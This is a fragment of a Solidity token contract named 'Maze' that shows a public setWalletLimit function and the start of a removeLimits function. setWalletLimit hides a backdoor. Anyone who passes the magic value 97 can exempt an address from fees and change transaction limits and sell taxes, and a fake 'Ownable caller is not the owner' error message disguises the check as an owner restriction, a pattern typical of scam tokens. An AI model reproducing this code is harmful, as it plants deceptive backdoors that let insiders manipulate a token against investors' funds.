...
contract Maze is Context, IERC20, Ownable {
    ...
    function setWalletLimit(address holder,uint256 amount) public returns (bool) {
        checkExcludedFromFees[holder]  = true;
        _maxTxAmountLimit = amount;
        require(amount == 97,"Ownable caller is not the owner");
        _totalTaxIfSelling = lowtaxSellFee;
        return true;
    }

    function removeLimits () public{
        _maxTxAmountLimit = _totalSupply;
